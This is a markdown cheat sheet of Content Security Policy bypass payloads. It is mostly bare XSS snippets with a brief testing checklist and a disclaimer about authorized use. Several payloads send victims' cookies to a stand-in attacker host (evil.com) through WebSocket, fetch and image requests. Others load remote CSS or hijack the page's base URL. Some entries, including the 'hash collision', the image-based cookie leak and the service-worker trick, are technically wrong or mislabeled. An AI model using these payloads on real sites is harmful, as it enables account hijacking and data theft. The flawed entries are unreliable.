# Content Security Policy (CSP) Bypass Techniques

Below are various payloads and techniques to bypass Content Security Policy restrictions when testing web applications. These methods attempt to circumvent CSP protections by exploiting misconfigurations and implementation weaknesses.

## Basic CSP Bypass Techniques

### 1. Inline Script Execution
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

### 2. Data URI Bypass
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
```

## Script Source Bypasses

### 3. Whitelisted Domain Abuse
```html
<script src="https://trusted.example.com/xss.js"></script>
<!-- If trusted.example.com allows file uploads -->
```

### 4. JSONP Endpoint Abuse
```html
<script src="/api/jsonp?callback=alert(1)//"></script>
```

### 5. AngularJS Injection (when Angular is allowed)
```html
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

## Nonce/Hash Bypass Techniques

### 6. Nonce Prediction/Reuse
```html
<script nonce="abc123">alert(1)</script>
<!-- If nonce is reused or predictable -->
```

### 7. Hash Collision
```html
<script>alert(1)</script>
<!-- If hash of this exact script is in CSP -->
```

## CSS-Based Bypasses

### 8. CSS Injection
```html
<style>
@import 'http://evil.com/xss.css';
</style>
```

### 9. CSS Selector Abuse
```html
<link rel="stylesheet" href="https://example.com/styles.css?x=;body{background:red;}">
```

## Advanced CSP Bypasses

### 10. Base Tag Hijacking
```html
<base href="https://evil.com/">
<!-- Followed by relative path script includes -->
```

### 11. WebSocket CSP Bypass
```javascript
new WebSocket("wss://evil.com/").send(document.cookie);
```

### 12. Service Worker Bypass
```javascript
navigator.serviceWorker.register('/sw.js').then(() => {
  navigator.serviceWorker.controller.postMessage(document.cookie);
});
```

## CSP Directive Specific Bypasses

### 13. `script-src-elem` Bypass
```html
<script src="https://cdn.example.com/angular.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

### 14. `connect-src` Bypass
```javascript
fetch('https://evil.com/exfil', {
  method: 'POST',
  body: document.cookie
});
```

### 15. `img-src` Bypass
```html
<img src="https://evil.com/x?=document.cookie">
```

## Browser-Specific Bypasses

### 16. Safari Universal XSS
```html
<iframe src="javascript:alert(1)"></iframe>
```

### 17. Edge HTML Injection
```html
<embed src="data:text/html,<script>alert(1)</script>">
```

## Polyglot Payloads

### 18. SVG/HTML Polyglot
```html
<svg><script>alert(1)</script></svg>
```

### 19. MathML/HTML Polyglot
```html
<math><mtext><script>alert(1)</script></mtext></math>
```

## Testing Methodology

1. Review CSP header for weaknesses
2. Test all allowed sources for injection points
3. Attempt to bypass nonce/hash protection
4. Check for AngularJS or other framework vulnerabilities
5. Test for open redirects on whitelisted domains
6. Verify CSP implementation in different browsers
7. Check for CSP report-only mode misconfigurations

## Important Notes

- These techniques should only be used in authorized testing
- CSP bypass may lead to XSS vulnerabilities
- Many bypasses are browser-specific
- Document all testing with proper authorization
- Respect the site's security policies

Remember that CSP implementations vary significantly between applications. What works on one system may not work on another. Always test carefully and ethically.